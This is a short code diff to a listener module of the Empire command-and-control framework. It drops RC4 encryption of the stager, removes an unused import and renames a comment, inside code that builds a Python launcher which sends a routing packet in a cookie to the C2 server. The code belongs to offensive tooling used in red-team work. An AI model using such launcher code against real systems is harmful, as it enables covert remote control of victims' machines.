@@ -4,7 +4,7 @@ import logging
 import os
 import random
 
-from empire.server.common import encryption, helpers, packets, templating
+from empire.server.common import helpers, packets, templating
 from empire.server.common.empire import MainMenu
 from empire.server.core.db.base import SessionLocal
 from empire.server.utils import listener_util
@@ -145,7 +145,7 @@ class Listener:
             b64RoutingPacket = base64.b64encode(routingPacket).decode("utf-8")
 
             launcherBase += "req=urllib.request.Request(server+t);\n"
-            # add the RC4 packet to a cookie
+            # add the routing packet to a cookie
             launcherBase += "req.add_header('User-Agent',UA);\n"
             launcherBase += (
                 f"req.add_header('Cookie',\"session={b64RoutingPacket}\");\n"
@@ -285,12 +285,7 @@ class Listener:
             # base64 encode the stager and return it
             if encode:
                 return base64.b64encode(stager)
-            if encrypt:
-                # return an encrypted version of the stager ("normal" staging)
-                RC4IV = os.urandom(4)
-                return RC4IV + encryption.rc4(
-                    RC4IV + stagingKey.encode("UTF-8"), stager.encode("UTF-8")
-                )
+
             # otherwise return the standard stager
             return stager
 
